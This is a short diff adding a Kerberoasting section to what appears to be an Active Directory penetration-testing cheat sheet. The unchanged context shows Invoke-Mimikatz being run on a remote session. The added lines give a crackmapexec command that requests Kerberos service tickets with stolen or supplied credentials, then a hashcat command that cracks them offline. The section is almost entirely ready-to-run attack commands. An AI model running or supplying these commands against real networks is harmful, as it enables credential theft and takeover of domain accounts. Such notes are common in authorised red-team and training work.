@@ -228,6 +228,16 @@ coming ...
 Invoke-Command -FilePath C:\AD\Tools\Invoke-Mimikatz.ps1 -Session $sess
 ```
 
+# Kerberoasting - ASK TGS
+
+find:
+```
+crackmapexec ldap <dcip> -u <user> -p <password> --kdcHost <dcip> --kerberoasting output.txtls
+```
+crack TGS offline:
+```
+hashcat -m 13100 <hash> -a 0 <wordlist> -o outputfile.txt
+```
 --------------------------------------------------------------
 
 # Check LIST
